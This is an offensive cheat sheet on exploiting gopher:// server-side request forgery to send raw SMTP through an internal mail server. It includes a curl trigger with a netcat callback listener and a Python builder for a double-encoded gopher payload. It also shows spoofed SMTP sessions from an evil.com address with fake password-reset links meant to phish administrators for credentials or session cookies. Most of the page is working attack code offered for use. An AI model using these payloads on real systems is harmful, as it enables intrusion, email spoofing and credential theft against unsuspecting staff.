# Gopher SSRF → SMTP (Internal Mail Relay)

If SSRF supports the `gopher://` scheme, use it to talk raw SMTP to an internal mail server and send emails as any address.

## Detect gopher support

```bash
# Trigger an SSRF that allows scheme selection, test gopher OOB
curl -X POST http://<TARGET>/proxy \
  -d 'url=gopher://<LHOST>:9999/test'
nc -lvnp 9999  # should receive connection
```

## Build gopher SMTP payload

```python
import urllib.parse

smtp = """EHLO attacker.com\r\nMAIL FROM: <noreply@target.com>\r\nRCPT TO: <victim@target.com>\r\nDATA\r\nFrom: noreply@target.com\r\nTo: victim@target.com\r\nSubject: Click this link\r\n\r\nhttp://<LHOST>/malicious\r\n.\r\nQUIT\r\n"""

# Gopher needs double URL-encoding for SSRF parameter
payload = "gopher://127.0.0.1:25/_" + urllib.parse.quote(smtp)
print(urllib.parse.quote(payload))  # double-encode for param
```

## SMTP open relay without gopher

If you can reach an internal SMTP directly (e.g. SSRF to port 25):
```bash
# telnet to internal SMTP
EHLO x
MAIL FROM:<attacker@evil.com>
RCPT TO:<admin@internal.corp>
DATA
Subject: Reset your password
Click: http://<LHOST>/reset
.
QUIT
```

Combine with phishing: send a password reset or file link to an admin to capture their credentials or session cookie via XSS.
